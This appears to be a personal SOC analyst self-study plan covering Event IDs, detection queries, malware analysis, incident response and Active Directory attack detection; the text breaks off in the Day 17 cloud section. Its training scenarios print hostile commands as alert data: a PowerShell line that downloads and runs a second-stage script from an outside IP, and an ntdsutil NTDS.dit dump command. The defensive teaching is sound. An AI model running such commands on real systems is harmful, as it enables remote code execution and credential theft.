# 🛡️ SOC Analyst Bootcamp — 20-Day Self-Study Plan

**Type:** Self-directed study | **Focus:** Blue Team / SOC Operations  
**Duration:** 20 Days | **Status:** 🟢 Complete (Day 20/20)

> Built as part of my preparation for SOC Analyst (L1/L2) roles alongside an active internship at the Kerala Police Cybercrime Unit.

---

## 🎯 Objective

To build job-ready SOC Analyst (L1/L2) skills through structured daily study covering
real-world tools, techniques, and scenarios used in Security Operations Centers.

---

## 📅 Progress Tracker

| Day | Topic | Status |
|-----|-------|--------|
| Day 1 | Windows Event Logs & Key Event IDs | ✅ Done |
| Day 2 | Logon Types, Persistence Mechanisms & MITRE ATT&CK Mapping | ✅ Done |
| Day 3 | Cyber Kill Chain & Attack Frameworks | ✅ Done |
| Day 4 | Network Traffic Analysis with Wireshark | ✅ Done |
| Day 5 | SIEM Basics & Splunk Fundamentals 1 | ✅ Done |
| Day 6 | Alert Triage & Escalation Workflow | ✅ Done |
| Day 7 | Mock Incident Response Scenarios (x5) + Extended Interview Prep (x2) | ✅ Done |
| Day 8 | Phishing Email Analysis | ✅ Done |
| Day 9 | Malware Behaviour Analysis (Static) | ✅ Done |
| Day 10 | Malware Behaviour Analysis (Dynamic) | ✅ Done |
| Day 11 | Threat Intelligence & IOC Hunting | ✅ Done |
| Day 12 | Endpoint Detection & Response (EDR) | ✅ Done |
| Day 13 | Memory Forensics Basics | ✅ Done |
| Day 14 | Incident Response Lifecycle | ✅ Done |
| Day 15 | SOC Playbooks & Runbooks | ✅ Done |
| Day 16 | Active Directory Attacks & Detection | ✅ Done |
| Day 17 | Cloud Security Monitoring (Azure/AWS) | ✅ Done |
| Day 18 | CTF — TryHackMe SOC Level 1 | ✅ Done |
| Day 19 | CTF — LetsDefend Practice Alerts | ✅ Done |
| Day 20 | Final Review & Mock SOC Scenario | ✅ Done |

---

## 📁 Mock Scenario Walkthroughs

Full end-to-end incident response scenarios practised during Day 7, documented with
alert details, triage steps, Event IDs, MITRE mappings, containment actions, and lessons learned.

| # | Scenario | Severity |
|---|----------|----------|
| 01 | [Brute Force RDP on Domain Controller](mock-scenarios/01-brute-force-rdp.md) | 🔴 Critical |
| 02 | [BEC Phishing — Finance Executive Compromise](mock-scenarios/02-phishing-c2.md) | 🔴 Critical |
| 03 | [Insider Threat — Departing Employee Exfiltration](mock-scenarios/03-insider-threat.md) | 🔴 Critical |
| 04 | [Ransomware — Network Propagation via Shared Drive](mock-scenarios/04-ransomware.md) | 🔴 Critical |
| 05 | [Privilege Escalation via Compromised Web Server](mock-scenarios/05-privilege-escalation.md) | 🔴 Critical |

---

## 🎤 Interview Drill Transcripts

Live, no-hints Q&A quiz drills — my actual answers followed by the correction, so the
reasoning gaps stay visible instead of edited out. Each ends with a self-graded scorecard.
A different format from the Mock Scenario Walkthroughs above: those are clean incident
playbooks, these are the raw practice reps.

| # | Drill | Topics |
|---|-------|--------|
| 01 | [NTDS Credential Dump on a Domain Controller](interview-drills/01-ntds-credential-dump-drill.md) | Event IDs, Logon Types, credential dumping, escalation briefs |
| 02 | [Privilege Escalation via Compromised Web Server](interview-drills/02-privilege-escalation-drill.md) | Account creation abuse, RDP pivoting, MITRE mapping, containment order |
| 03 | [Fileless Malware via Phishing (Marketing Executive)](interview-drills/03-fileless-malware-drill.md) | PowerShell obfuscation, Cyber Kill Chain positioning, time-critical containment |

---

## 📚 Topics Covered

### ✅ Day 1 — Windows Event Logs & Key Event IDs

- Windows Event Log structure and log types
- Key Event IDs every SOC analyst must know

| Event ID | Description |
|----------|-------------|
| 4624 | Successful logon |
| 4625 | Failed logon |
| 4648 | Logon with explicit credentials |
| 4672 | Special privileges assigned |
| 4688 | New process created |
| 4698 | Scheduled task created |
| 4720 | User account created |
| 4732 | User added to privileged group |
| 4740 | Account locked out |
| 7045 | New service installed |

---

### ✅ Day 2 — Logon Types, Persistence & MITRE ATT&CK

**Logon Types**

| Type | Name | Description | Red Flag Condition |
|------|------|-------------|-------------------|
| 2 | Interactive | Local keyboard login | Normal for workstations |
| 3 | Network | SMB, file shares, WinRM | Admin account on DC from unknown host |
| 4 | Batch | Scheduled tasks | Unexpected on sensitive servers |
| 5 | Service | Service starting under account | Unusual service account on critical system |
| 7 | Unlock | Workstation unlock | Normal |
| 10 | RemoteInteractive | RDP session | From external IP or non-admin user |
| 11 | CachedInteractive | Offline cached credentials | Normal for laptops offline |

**Persistence Mechanisms & MITRE Mappings**

| Technique | MITRE ID | Detection |
|-----------|----------|-----------|
| Scheduled Tasks | T1053.005 | Event ID 4698 |
| Registry Run Keys | T1547.001 | Registry monitoring |
| Startup Folder | T1547.001 | File system monitoring |
| New Service Creation | T1543.003 | Event ID 7045 |
| PowerShell Profile | T1546.013 | PowerShell logging |

**Parent-Child Process Red Flags**

| Process | Legitimate Parent | Suspicious Parent |
|---------|------------------|-------------------|
| svchost.exe | services.exe | explorer.exe, cmd.exe, any user process |
| powershell.exe | explorer.exe, cmd.exe | WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE |
| cmd.exe | explorer.exe | Office applications |
| lsass.exe | wininit.exe ONLY | Any other parent |

---

### ✅ Day 3 — Cyber Kill Chain & Attack Frameworks

**Cyber Kill Chain — 7 Stages**

| Stage | Description | L1 Detection Point |
|-------|-------------|-------------------|
| 1. Reconnaissance | Attacker gathers intel on the target | Threat intel feeds |
| 2. Weaponization | Crafting malware and exploit payloads | Sandbox analysis |
| 3. Delivery | Phishing emails, USB drops, watering holes | Email gateway, AV scan |
| 4. Exploitation | Triggering the vulnerability | EDR alerts, 4688 |
| 5. Installation | Malware establishes persistence | 7045, 4698, EDR |
| 6. Command & Control | Attacker maintains remote access | SIEM outbound, proxy/DNS |
| 7. Actions on Objectives | Data theft, ransomware, disruption | DLP, file access, SIEM |

> **L1 is most active at stages 3, 5, 6, and 7.**  
> When you see Stage 5 (Installation) — Stage 6 (C2) is seconds away. Contain immediately.

---

### ✅ Day 4 — Network Traffic Analysis with Wireshark

- TCP 3-way handshake and half-open connections (SYN flood detection)
- Common ports and their attack relevance

| Port | Service | Attack Risk |
|------|---------|-------------|
| 22 | SSH | Brute force |
| 25 | SMTP | Email spoofing |
| 53 | DNS | DNS exfiltration, poisoning |
| 80/443 | HTTP/HTTPS | C2 over web traffic |
| 445 | SMB | Lateral movement, ransomware spread |
| 3389 | RDP | Brute force, remote intrusion |

- Firewall vs IDS vs IPS — difference, placement, log types generated
- DNS poisoning and ARP spoofing detection patterns

---

### ✅ Day 5 — SIEM Basics & Splunk Fundamentals 1

**Core Splunk SPL Queries**

```spl
# Failed logins in last 24h — brute force detection
index=windows EventCode=4625 earliest=-24h
| stats count by src_ip, Account_Name
| where count > 5
| sort -count

# Success after failures (same source) — confirmed intrusion
index=windows (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
         count(eval(EventCode=4624)) as successes by src_ip
| where failures > 10 AND successes > 0

# Fake svchost — masquerading detection
index=windows EventCode=4688
| search Process_Name=*svchost* AND NOT
  New_Process_Name="C:\\Windows\\System32\\svchost.exe"
| table _time, host, Creator_Process_Name, New_Process_Name

# Outbound C2 connection check
index=network dest_ip=<suspicious_ip>
| stats sum(bytes_out) as total_bytes by src_ip, dest_port
| eval MB=round(total_bytes/1024/1024,2)
| table src_ip, dest_port, MB
```

**SIEM Concepts**
- Log aggregation, correlation, alerting, dashboards
- Use case tuning — reducing false positives without missing true positives
- Severity ratings are starting points — analyst judgment determines final severity

---

### ✅ Day 6 — Alert Triage & Escalation Workflow

**Escalation Brief Formula: WHO → WHAT → WHEN → WHERE → IMPACT → DONE → NEED**

Example:
> *"Source IP 185.220.101.45, known Tor exit node, brute-forced CORP-DC01 via RDP —
> 87 failures then success at 02:51 AM as Administrator, Logon Type 10. DC01 is prod
> domain controller. AbuseIPDB: 97% abuse score. Lateral movement confirmed to FS01
> via svc_backup. Both hosts isolated via EDR. Recommend forensic imaging.
> Do I have approval to engage IR team?"*

**Severity Upgrade Rules**
- Target is Domain Controller, Finance server, or Executive endpoint → upgrade immediately
- Source IP confirmed malicious on AbuseIPDB / VirusTotal → upgrade
- Successful logon follows cluster of failures → upgrade
- Departing employee + sensitive file types → upgrade
- Privileged account behaving abnormally → upgrade

**Incident Ticket Structure**
```
Ticket ID: INC-YYYY-XXXX
Type: [Brute Force / Intrusion / Phishing / Ransomware / Insider / Priv Esc]
Severity: Critical / High / Medium / Low
Priority: P1 / P2 / P3
Status: Detected → Triaged → Contained → Eradicated → Closed
Assigned To: [L2 Name]
Opened: HH:MM | Contained: HH:MM | Closed: HH:MM
Actions Taken (timestamped — mandatory):
02:47 — Alert triggered in SIEM. L1 triage initiated.
02:48 — Source IP checked on AbuseIPDB. 97% score, confirmed Tor exit node.
02:50 — Event ID 4624 success confirmed. Escalated to L2 [Name].
02:55 — Isolation approved. EDR isolation applied to CORP-DC01.
```

---

### ✅ Day 7 — Mock Incident Response Scenarios

> Five high-pressure SOC L1 scenarios practised end-to-end — triage, investigation,
> containment, escalation brief, and documentation. Scenarios covered: Brute Force RDP,
> BEC Phishing, Insider Threat, Ransomware Propagation, and Privilege Escalation via
> Compromised Web Server. Each mirrors real-world alert conditions in a 24×7 SOC environment.
>
> Full write-ups for each scenario live in [`mock-scenarios/`](mock-scenarios/) — linked
> in the table above.

---

### ✅ Day 7 Extended — Interview Drills: Credential Access & Fileless Execution

> Two additional high-pressure interview drills run after the core five scenarios.
> Focused on Event ID analytical depth, NTDS credential dumping, valid account abuse,
> and fileless malware triage.

---

#### 🔴 Extended Scenario 01 — NTDS Credential Dump on Domain Controller

**Primary Tactic: Credential Access → Exfiltration**

**Alert Chain:**
```
06:44 AM — Event ID 4625 × 3 failures | Account: Administrator | Source: 10.0.0.44 | Logon Type: 3
06:49 AM — Event ID 4624 success      | Account: Administrator | Source: 10.0.0.44 | Logon Type: 3
06:51 AM — Event ID 4688              | Creator: cmd.exe | New Process: ntdsutil.exe
Command: ntdsutil "ac i ntds" "ifm" "create full c:\temp\dump" q q
```

**Why 3 failures on DC01 is not noise:**
- Target is the built-in Administrator account on a Domain Controller
- Built-in Administrator on a DC should almost never appear via network Logon Type 3
- Internal source IP (10.0.0.44) needs investigation — legitimate admin box or compromised internal machine?
- Asset criticality overrides low failure count

**What ntdsutil "create full c:\temp\dump" is doing:**
> This is an NTDS.dit database dump — not metadata cleanup.
> NTDS.dit is the Active Directory database: every user account, every password hash,
> every Kerberos key in the entire domain. Dumped to a temp folder = staged for exfiltration.
> If successful, the attacker can crack every password offline and own the entire organisation
> without ever logging in again.
>
> MITRE T1003.003 — OS Credential Dumping: NTDS  
> Every credential in the domain must be treated as compromised.

**Event IDs to pull after 4624 success on DC01 — in priority order:**

| Event ID | Why — not just what |
|----------|---------------------|
| 4672 | Did this session receive admin-level privileges? Confirms full scope of access. |
| 4688 | What processes ran after login? CMD, PowerShell, mimikatz — this is your attack chain. |
| 4698 | Did they create a scheduled task for persistence before anything else? |
| 4634 | Session end — useful for timeline reconstruction, not your first move. |

**Scheduled Task Red Flags — 3 specific indicators:**
```
Task Name:  \Microsoft\Windows\UpdateHealth   ← designed to look legitimate
Action:     C:\Users\Public\svchost.exe       ← world-writable folder, never a real Windows path
Created By: NT AUTHORITY\SYSTEM at 11:23 PM  ← SYSTEM creating new tasks at night = prior compromise
```

> If NT AUTHORITY\SYSTEM is creating tasks, something already running as SYSTEM planted it.
> That means there is a prior compromise you haven't found yet — work backwards.

**Escalation Brief:**
> *"Confirmed credential dump on CORP-DC01. Internal host 10.0.0.44 brute-forced the
> built-in Administrator account via network logon, authenticated at 06:49, immediately
> ran ntdsutil to dump the full NTDS.dit to C:\temp\dump. That's every password hash in
> the domain. Rating this Critical. Need approval to isolate DC01 and 10.0.0.44. Recommend
> treating this as a full domain compromise — every credential needs rotation. Do I have your go-ahead?"*

**Valid Account Detection — the hardest L1 scenario:**
```
Event ID: 4624
Account: svc_sqlbackup
Source Host: CORP-WEB01
Target Host: CORP-DB01
Logon Type: 3
Times: Mon 01:43 | Tue 03:12 | Wed 02:58 | Thu 02:17
AV: Clean | Failed logins: None | Account: Legitimate
```

> ⚠️ "Everything looks clean" is not an answer. This is MITRE T1078 — Valid Accounts.
> Attackers operating with legitimate credentials inside normal infrastructure is the
> hardest attack to catch — and the most common L1 failure mode.

**Red flags in this clean-looking alert:**
- Randomised timing — legitimate scheduled tasks run at fixed times. Randomisation is a deliberate attacker technique to evade time-based detection rules
- Web server authenticating to database server — backups typically run from a dedicated backup server, not the web tier
- Pattern started this week — if svc_sqlbackup is 2 years old but this behaviour started Monday, something changed Monday

**How to prove benign vs malicious:**

| To prove benign | To prove malicious |
|----------------|-------------------|
| Check documented purpose — should it run from WEB01? | Pull 4688 on WEB01 around each logon time — what process initiated this? |
| Pull task scheduler on WEB01 — registered task? | Has svc_sqlbackup accessed anything beyond DB01 this week? |
| Verify with DBA team — do they have a matching backup job? | Check 4698 on WEB01 — was a new task created recently? |
| Check DB01 activity — legitimate backup = large read activity | Pull WEB01 compromise history — any alerts in last 2 weeks? |

---

#### 🔴 Extended Scenario 02 — Fileless Malware via Phishing (Marketing Executive)

**Primary Tactic: Initial Access → Execution → Privilege Escalation → C2**

**Alert Chain:**
```
14:13 — Event ID 4624  | Account: sarah.thomas | Host: CORP-SARAH-PC01 | Logon Type: 2
14:13 — Event ID 4672  | Account: sarah.thomas | Privileges: SeDebugPrivilege,
                         SeImpersonatePrivilege, SeTcbPrivilege
14:11 — Event ID 4688  | Creator: OUTLOOK.EXE | New Process: powershell.exe
Command: powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBuAHYAbwBr...
```

**Why 4672 on a marketing executive is Critical:**
> SeDebugPrivilege, SeImpersonatePrivilege, and SeTcbPrivilege together = near-SYSTEM level access.
> A marketing executive has no legitimate reason for any of these three privileges.
> Her account is either compromised or malware running under her session performed privilege escalation.

**What -EncodedCommand actually means:**
> `-EncodedCommand` accepts a Base64-encoded string and executes it as PowerShell at runtime.
> The long string in the logs is not a hash — it is Base64-encoded PowerShell code that
> decodes and runs in memory. Attackers use it to evade signature-based detection: tools
> scanning for keywords like `Invoke-Mimikatz` or `DownloadString` see nothing in plain text.
>
> MITRE T1027 — Obfuscated Files or Information
>
> To decode in a sandbox:
> ```powershell
> [System.Text.Encoding]::Unicode.GetString(
> [System.Convert]::FromBase64String('SQBuAHYAbwBrAGUA...'))
> ```

**Decoded payload:**
```powershell
IEX (New-Object Net.WebClient).DownloadString(
    'http://185.220.101.12/stage2/payload.ps1')
```

> `IEX` = Invoke-Expression — executes whatever string is passed to it at runtime.
> This command downloads a second-stage payload and executes it entirely in memory.
> No file is written to disk. Traditional forensics finds nothing.

**Kill Chain position:**
```
Stage 1–4 ✓ Done (recon, weaponize, delivery, exploitation — Outlook macro)
Stage 5   → HAPPENING NOW (stage2/payload.ps1 downloading)
Stage 6   → SECONDS AWAY (payload will beacon out)
Stage 7   → NOT YET — but imminent
```

**Four immediate actions — 60-second window:**
1. **Block 185.220.101.12 at perimeter firewall** — one rule protects all endpoints simultaneously
2. **Isolate CORP-SARAH-PC01 via EDR** — cuts this machine while firewall covers everyone else
3. **Memory dump immediately** — IEX executes in memory only; payload.ps1 never touches disk; memory dump is the only forensic artifact
4. **Pull DNS and proxy logs** — check if any other hosts have contacted this IP; hunt for lateral spread before it becomes an outbreak

**MITRE ATT&CK:**

| Technique | ID |
|-----------|-----|
| Phishing: Spearphishing Attachment | T1566.001 |
| PowerShell | T1059.001 |
| Obfuscated Files or Information | T1027 |
| Abuse Elevation Control Mechanism | T1548 |
| C2 over HTTP | T1071.001 |

**Key Lessons:**
- SeDebugPrivilege + SeImpersonatePrivilege + SeTcbPrivilege on a non-admin = immediate Critical
- `-EncodedCommand` is Base64 obfuscation, not a hash — know the difference
- IEX = fileless execution — memory dump is your only evidence
- Block at firewall first, isolate endpoint second — order matters when you have seconds

---

### ✅ Day 8 — Phishing Email Analysis

**Email header fields that matter**

| Header | What to check | Red flag |
|--------|---------------|----------|
| From | Display name vs actual address | Display name = "CEO", address = gmail/lookalike domain |
| Return-Path | Where bounces go | Different domain from From |
| Reply-To | Where replies go | Differs from From (BEC classic) |
| Received (read bottom-up) | Real sending path | Origin IP/host unrelated to claimed sender |
| Authentication-Results | SPF / DKIM / DMARC verdicts | Any `fail`, `softfail`, `none` |
| Message-ID | Domain of originating server | Mismatch with From domain |

**SPF / DKIM / DMARC**
- **SPF** — is the sending IP authorised for the envelope domain?
- **DKIM** — is the message signed and unaltered in transit?
- **DMARC** — do SPF/DKIM *align* with the visible From domain, and what policy applies (none / quarantine / reject)?
- All three can pass on a lookalike domain the attacker owns. Passing authentication ≠ safe.

**Phishing triage workflow**
1. Pull the original `.eml` — never analyse a screenshot or forward-as-attachment copy
2. Read headers bottom-up, check Authentication-Results
3. Extract URLs — defang, then check in URLScan / VirusTotal (never click)
4. Extract attachments — hash (SHA256), check VirusTotal, detonate in sandbox
5. Scope — search mail gateway for same sender, subject, URL, attachment hash
6. Check whether anyone clicked (proxy logs) or opened (EDR process tree: `OUTLOOK.EXE → WINWORD.EXE → powershell.exe`)
7. Contain, document, close

**Containment actions**
- Purge message from all mailboxes
- Block sender, domain, URL, and IOC hash at gateway/proxy
- If user clicked or entered creds: reset password, revoke sessions/tokens, review mailbox rules (inbox forwarding = BEC persistence)

**Defanging:** `hxxp://evil[.]com/login` — prevents accidental clicks when pasting into tickets.

| Technique | MITRE ID |
|-----------|----------|
| Phishing: Spearphishing Attachment | T1566.001 |
| Phishing: Spearphishing Link | T1566.002 |
| User Execution: Malicious File | T1204.002 |
| Email Forwarding Rule | T1114.003 |

---

### ✅ Day 9 — Malware Behaviour Analysis (Static)

> Static analysis = examine the file **without executing it**.

**Static workflow**
```bash
sha256sum sample.exe                 # unique fingerprint -> VirusTotal lookup
file sample.exe                      # real file type (magic bytes), not the extension
strings -n 8 sample.exe | less       # URLs, IPs, registry keys, commands
floss sample.exe                     # also recovers obfuscated/stack strings
```

**What to look for**

| Artifact | Why it matters |
|----------|----------------|
| Hash match on VirusTotal | Instant family/detection context |
| Magic bytes `MZ` on a file named `.pdf`/`.jpg` | Masquerading |
| High section entropy (> ~7.0) | Packed or encrypted payload |
| Few imports, e.g. only `LoadLibrary` + `GetProcAddress` | Packer resolving APIs at runtime |
| Embedded URLs / IPs / registry `Run` keys | C2 and persistence hints |
| Compile timestamp | Often faked, treat as weak evidence |

**Suspicious Windows API imports**

| API | Suggests |
|-----|----------|
| `VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread` | Process injection |
| `URLDownloadToFile`, `InternetOpen`, `WinHttpSendRequest` | Download / C2 |
| `RegSetValueEx`, `CreateService` | Persistence |
| `SetWindowsHookEx`, `GetAsyncKeyState` | Keylogging |
| `IsDebuggerPresent`, `CheckRemoteDebuggerPresent` | Anti-analysis |
| `CryptEncrypt`, `CryptGenKey` | Possible ransomware |

**Tools:** PEStudio, Detect It Easy (DIE), CFF Explorer, FLOSS, VirusTotal.  
**Limitation:** static analysis struggles against packing and obfuscation. That is where Day 10 takes over.

---

### ✅ Day 10 — Malware Behaviour Analysis (Dynamic)

> Dynamic analysis = run the sample in an **isolated lab** and observe.

**Lab safety rules**
- Disposable VM with a clean snapshot, revert after every run
- Host-only or fully isolated network (use FakeNet-NG / INetSim to simulate internet)
- No shared folders, no clipboard sharing, no personal accounts logged in

**Observation toolkit**

| Tool | What it shows |
|------|---------------|
| Process Monitor (ProcMon) | File, registry, process activity |
| Process Explorer | Process tree, injected modules, network handles |
| Regshot | Registry/file diff before vs after |
| Wireshark + FakeNet-NG | DNS lookups, beacons, C2 protocol |
| ANY.RUN / Hybrid Analysis | Automated sandbox report |

**Behaviours to flag**
- Drops files into `%TEMP%`, `%APPDATA%`, `C:\Users\Public`
- Writes `HKCU\...\Run` or creates a service (T1547.001, T1543.003)
- Spawns `cmd.exe` / `powershell.exe` from an unusual parent
- Periodic DNS/HTTP beaconing at fixed intervals
- Injects into `explorer.exe` / `svchost.exe`
- Deletes shadow copies (`vssadmin delete shadows`) → ransomware indicator

**Sysmon Event IDs worth knowing**

| ID | Meaning |
|----|---------|
| 1 | Process creation (with hashes, parent, command line) |
| 3 | Network connection |
| 7 | Image/DLL loaded |
| 8 | CreateRemoteThread (injection) |
| 10 | Process access (e.g. LSASS access) |
| 11 | File created |
| 12/13 | Registry object / value set |
| 22 | DNS query |

**Output of analysis = IOCs** (hashes, domains, IPs, mutexes, dropped file paths, registry keys) handed to detection and blocking teams.

---

### ✅ Day 11 — Threat Intelligence & IOC Hunting

**IOC vs IOA**
- **IOC** — evidence something happened (hash, IP, domain). Easy to change.
- **IOA** — behaviour of an attack in progress (Office spawning PowerShell). Harder for attackers to change.

**Pyramid of Pain (easiest → hardest for attacker to change)**
Hash values → IP addresses → Domain names → Network/host artifacts → Tools → **TTPs**

> Detections at the TTP level hurt attackers most. Hash blocking is the weakest control.

**Intel sources**

| Source | Use |
|--------|-----|
| VirusTotal | File/URL/IP/domain reputation |
| AbuseIPDB | IP abuse reports and confidence score |
| AlienVault OTX | Community pulses |
| URLhaus / MalwareBazaar | Malicious URLs / samples |
| Shodan | What an IP exposes |
| MISP | Sharing and correlating IOCs |
| MITRE ATT&CK | Adversary TTPs |

**IOC hunt in Splunk**
```spl
# Any host that talked to a known-bad IP list
index=network [ | inputlookup bad_ips.csv | rename ip as dest_ip | fields dest_ip ]
| stats count, values(dest_port) as ports, latest(_time) as last_seen by src_ip, dest_ip
| sort -count

# Known-bad file hash seen in process creation
index=windows EventCode=4688 OR source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search Hashes=*<SHA256>*
| table _time, host, Image, ParentImage, CommandLine
```

**Intel handling basics**
- Check IOC age and context. Stale IPs (cloud/CDN, reassigned) cause false positives.
- TLP markings (CLEAR / GREEN / AMBER / RED) control who you may share with.
- An IOC hit means *investigate*, not *confirmed compromise*.

---

### ✅ Day 12 — Endpoint Detection & Response (EDR)

**EDR vs AV**

| | Antivirus | EDR |
|---|-----------|-----|
| Detection | Signatures, known files | Behaviour, telemetry, IOAs |
| Visibility | Verdict only | Full process tree, network, file, registry history |
| Response | Quarantine file | Isolate host, kill process, remote shell, collect artifacts |

**What EDR telemetry gives an L1**
- Process tree with command lines
- Network connections per process
- File/registry modifications
- Logon activity and loaded modules
- Historical search across the fleet (hunt for the same hash/behaviour on every endpoint)

**EDR alert triage flow**
1. Read the detection: tactic, technique, severity, confidence
2. Open the process tree. Who spawned what? (`WINWORD.EXE → powershell.exe` = bad)
3. Check command line, hash reputation, network destination
4. Check user context and host criticality (DC / finance / executive → upgrade)
5. Search fleet for the same hash/IOC
6. Decide: false positive / true positive benign / true positive malicious
7. If malicious: **network-isolate via EDR**, kill process, escalate with brief, preserve artifacts

**Containment options**

| Action | When |
|--------|------|
| Network isolate host | Active C2, lateral movement, ransomware |
| Kill process / quarantine file | Contained, single-host malware |
| Disable account | Credential compromise |
| Live response / collect triage package | Evidence before remediation |

**Sample hunt (Microsoft Defender KQL)**
```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe")
| where FileName in~ ("powershell.exe","cmd.exe","wscript.exe","mshta.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

**Tools worked with (concepts):** CrowdStrike Falcon, Microsoft Defender for Endpoint.

---

### ✅ Day 13 — Memory Forensics Basics

**Why memory matters:** fileless malware, injected code, decrypted payloads, and live network connections often exist *only* in RAM.

**Order of volatility:** CPU registers/cache → **RAM** → network state → running processes → disk → logs/backups. Capture RAM **before** powering off or reimaging.

**Acquisition tools:** WinPmem, DumpIt, FTK Imager, Belkasoft RAM Capturer. Hash the image and log chain of custody.

**Volatility 3 core plugins**
```bash
vol -f mem.raw windows.info              # OS profile confirmation
vol -f mem.raw windows.pslist            # processes from the active list
vol -f mem.raw windows.psscan            # scans pool tags, finds hidden/terminated processes
vol -f mem.raw windows.pstree            # parent-child view
vol -f mem.raw windows.cmdline           # command line per process
vol -f mem.raw windows.netscan           # network connections and listeners
vol -f mem.raw windows.malfind           # injected code (RWX regions with executable content)
vol -f mem.raw windows.dlllist --pid <PID>
```

**Reading the output**

| Finding | Meaning |
|---------|---------|
| In `psscan` but not `pslist` | Hidden process (rootkit/DKOM) |
| `svchost.exe` with wrong parent | Masquerading (should be `services.exe`) |
| Duplicate `lsass.exe` / not child of `wininit.exe` | Fake LSASS |
| `malfind` hit in a legitimate process | Process injection (T1055) |
| `netscan` shows process → unknown external IP | Likely C2 |
| `PAGE_EXECUTE_READWRITE` region with `MZ` header | Injected PE |

**Link to earlier work:** the fileless PowerShell/IEX scenario from Day 7 is exactly where a memory dump is the only evidence.

---

### ✅ Day 14 — Incident Response Lifecycle

**NIST SP 800-61 phases**
1. **Preparation** — tooling, playbooks, contacts, logging, training
2. **Detection & Analysis** — alert triage, scoping, severity, IOCs
3. **Containment, Eradication & Recovery** — stop spread, remove cause, restore
4. **Post-Incident Activity** — lessons learned, detection improvements

(SANS equivalent: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned.)

| Phase | L1 role |
|-------|---------|
| Preparation | Know playbooks, tools, escalation contacts |
| Detection & Analysis | Triage, enrich, document, escalate with brief |
| Containment | Execute approved actions (EDR isolate, block IP, disable account) |
| Eradication / Recovery | Support L2/IR; validate clean state |
| Lessons learned | Contribute timeline, tune detections |

**Containment: short-term vs long-term**
- Short-term: isolate host, block IP/domain, disable account. Stop the bleeding.
- Long-term: patch, rebuild, rotate credentials, segment network.

**Evidence handling**
- Preserve before remediating (memory, disk image, logs)
- Hash everything, maintain **chain of custody**
- Timestamped actions in the ticket are mandatory (UTC where possible)

**Post-incident questions**
- How did it get in? How long was dwell time? What detected it, and what should have?
- What detection rule or control would have caught it earlier?

**Mapped to my mock scenarios:** RDP brute force (Detection → Containment via block + isolate), Ransomware (Containment priority: isolate before anything else), Insider threat (evidence preservation + HR/legal coordination).

---

### ✅ Day 15 — SOC Playbooks & Runbooks

| | Playbook | Runbook |
|---|----------|---------|
| Level | Strategic: *what* to do and decision points | Tactical: *exact steps* in a tool |
| Example | "Phishing response" | "Purge email in Defender via Threat Explorer" |
| Audience | L1–L3, management | Whoever executes the step |

**Playbook skeleton**
```
Name / ID:
Trigger:            (alert, report, hunt finding)
Severity criteria:
Roles:              (L1, L2, IR lead, comms, legal)
Steps:              Triage -> Enrich -> Decide -> Contain -> Eradicate -> Recover
Decision points:    (e.g. creds entered? -> reset + revoke sessions)
Escalation criteria & contacts:
Evidence to collect:
Closure criteria:
Metrics:            MTTD / MTTR
```

**Example: Phishing playbook (condensed)**
1. Trigger: user report or gateway alert
2. Pull original email, analyse headers/URLs/attachments (Day 8)
3. Decision: malicious? → No: close as benign with note. Yes: continue
4. Scope: search all mailboxes for sender/subject/URL/hash
5. Contain: purge, block sender/domain/URL
6. Clicked or opened? → Yes: isolate endpoint, reset credentials, review mailbox rules, hunt EDR for child processes
7. Document, notify user, update blocklists, close

**Example: Ransomware playbook (condensed)**
1. Isolate affected hosts immediately (EDR), do **not** power off (preserve memory)
2. Identify patient zero and spread path (SMB/445, shared drives)
3. Disable compromised accounts, block C2 IOCs
4. Protect backups, check they are offline/immutable
5. Escalate to IR lead + management, legal/comms as required
6. Eradicate, restore from clean backups, rotate credentials, monitor for reinfection

**SOAR note:** playbooks get automated for repetitive steps (enrichment, IOC lookups, ticket creation), with human approval gates before destructive actions like isolation.

---

### ✅ Day 16 — Active Directory Attacks & Detection

| Attack | MITRE | What happens | Detection |
|--------|-------|--------------|-----------|
| Password spraying | T1110.003 | One password tried against many accounts | Many 4625 / 4771 across accounts from one source |
| Kerberoasting | T1558.003 | Request service tickets, crack offline | 4769 with encryption type `0x17` (RC4), many SPNs requested by one user |
| AS-REP Roasting | T1558.004 | Accounts without pre-auth, crack offline | 4768 with pre-auth type `0` |
| Pass-the-Hash | T1550.002 | Authenticate with NTLM hash, no password | 4624 Type 3, NTLM, `NtLmSsp` logon process, unusual source |
| Pass-the-Ticket | T1550.003 | Reuse stolen Kerberos ticket | 4768/4769 anomalies, ticket used from different host |
| DCSync | T1003.006 | Abuse replication rights to pull hashes | 4662 with replication GUIDs from a non-DC account |
| NTDS.dit dump | T1003.003 | Copy AD database | 4688 `ntdsutil` / `vssadmin`, Volume Shadow Copy activity |
| Golden Ticket | T1558.001 | Forged TGT using krbtgt hash | TGT with abnormal lifetime, 4769 without preceding 4768 |

**Key AD Event IDs**

| ID | Meaning |
|----|---------|
| 4768 | Kerberos TGT requested |
| 4769 | Kerberos service ticket requested |
| 4771 | Kerberos pre-authentication failed |
| 4776 | NTLM credential validation |
| 4662 | Operation performed on AD object |
| 4728 / 4732 / 4756 | Member added to security group |

**Detection queries**
```spl
# Kerberoasting: RC4 service tickets, user accounts only
index=windows EventCode=4769 Ticket_Encryption_Type=0x17 Service_Name!="*$"
| stats dc(Service_Name) as spns, count by Account_Name, src_ip
| where spns > 5

# DCSync: replication request from a non-DC
index=windows EventCode=4662 Properties="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*"
| search NOT Account_Name="*$"
| table _time, Account_Name, src_ip, host
```

**Response when AD credential theft is confirmed:** treat the domain as compromised. Isolate source host, disable the abused account, rotate privileged credentials, **reset `krbtgt` twice**, hunt for persistence.

---

### ✅ Day 17 — Cloud Security Monitoring (Azure / AWS)

**Shared responsibility:** the provider secures the platform; *you* secure identities, configuration, data, and access. Most cloud breaches are identity and misconfiguration, not provider hacks.

**Log sources**

| Platform | Log | Shows |
|----------|-----|-------|
| Azure / Entra ID | Sign-in logs | Auth attempts, MFA result, location, risk |
